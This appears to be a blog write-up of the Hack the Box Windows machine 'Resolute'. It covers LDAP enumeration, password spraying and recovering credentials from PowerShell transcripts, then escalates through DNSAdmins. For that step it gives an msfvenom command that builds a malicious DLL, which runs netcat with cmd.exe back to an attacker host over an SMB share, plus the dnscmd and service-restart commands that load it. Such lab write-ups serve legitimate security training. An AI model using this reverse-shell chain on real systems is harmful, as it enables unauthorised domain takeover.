+++
author = "Nick"
categories = ["hack the box", "windows", "WinRM", "dll injection", "dns admin", "hydra", "evil-winrm", "smb"]
date = 2020-05-30T14:56:00Z
description = ""
draft = false
thumbnail = "/images/2019/12/resolute.png"
slug = "hack-the-box-resolute"
tags = ["hack the box", "windows", "WinRM", "dll injection", "dns admin", "hydra", "evil-winrm", "smb"]
title = "Hack the Box - Resolute"

+++


Welcome back everyone! Today we are going to be doing the machine Resolute on Hack the Box. This is a Windows machine with a medium difficulty. Let's jump in!

As usual, start with the standard `nmap`: 
```bash 
nmap -sC -sV -T4 -p- -oA resolute 10.10.10.169`
``` 
Here are our results:
```
Host is up (0.24s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-09 19:23:46Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m00s, deviation: 4h37m08s, median: 7m00s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2019-12-09T11:24:29-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-12-09T19:24:35
|_  start_date: 2019-12-09T18:37:33

```

We can start by checking to see if we can enumerate `LDAP` anonymously. To do that we issue: `ldapsearch -x -h megabank.local`

![](/images/2019/12/image-44.png)

We get a response back. So we now know that if we combine our leaked FQDN with our search string, we can start searching the structure.

Command:
```ldapsearch -x -h megabank.local -b 'dc=megabank,dc=local'```

This gives us 270 entries, so we save that output. We can further define our search with `LDAP` queries attached to `ldapsearch`. We want to get just users right now.

Command:
`ldapsearch -x -h megabank.local -p 3268 -b 'dc=megabank,dc=local' "(&(objectClass=user))"`

We can save that output and start parsing through it. We have an interesting note on one of the accounts.

![](/images/2019/12/image-45.png)

I wonder if this password is still valid. It's not, however, a common tactic is to reuse a password for a group of new users. So in this case we try to use the same password for all of the accounts that we found. We get one, ```Melanie```. You can also send a currated listed through `Hydra` to spray all the accounts.

![](/images/2019/12/resolute_spray.gif)

We login as Melanie and get our user flag from her Desktop. We start to look around the box and see a PSTranscripts folder. Inside this is another folder that has the logging output of a script that has been run. Inside the script, we have credentials for ```Ryan```.

![](/images/2019/12/image-46.png)

We can now login as Ryan. We do some more enumeration and see that Ryan is part of the DNSAdmins group.

![](/images/2019/12/image-47.png)

If you've been a System Administrator or on a Red Team you know this is a valid path to escalation. [Here](https://adsecurity.org/?p=4064) and [here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) are two quick articles on the topic. So our goal here is to create a malicious dll file with `msfpc` or `msfvenom`. Host it on an `smb share`. Then tell our DNS system to load the dll. This should then execute our payload and connect back to us.

This payload is slightly different than the normal ones we use. This time we are also embedding our command to call.

Command:
`msfvenom -p windows/x64/exec cmd='\\10.10.15.129\share\nc.exe 10.10.15.129 80 -e cmd.exe' -f dll > rootme.dll`

Now we need to move it to where we will host our SMB share. For me thats the Tools directory. We also want to make sure we have a copy of `netcat` for Windows on our share as well. Since our payload calls back to our share to use it.

Command:
`impacket-smbserver -smb2support share .`

This spins up our SMB share called 'share'. Now we just need to get our payload loaded. Within Windows we can use the `dnscmd.exe` tool from the CLI. We tell it to load the payload.

Command:
`dnscmd resolute /config /serverlevelplugindll \\10.10.15.129\share\rootme.dll`

A quick breakdown of this command:
`dnscmd` is the tool we are calling.
`resolute` is the server hostname.
`/config` issues a config wipe for the zone.
`/serverlevelplugindll` tells the system to load a specific plugin.

Once we've loaded our malicious dll, we need to restart the DNS services.

Command:
`sc.exe \\Resolute stop dns`
then
`sc.exe \\Resolute start dns`

We should then see our SMB Share light up, followed by our Netcat session.

![](/images/2019/12/resolute_root.gif)

We are in as root! Off to the root flag! Box complete.

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

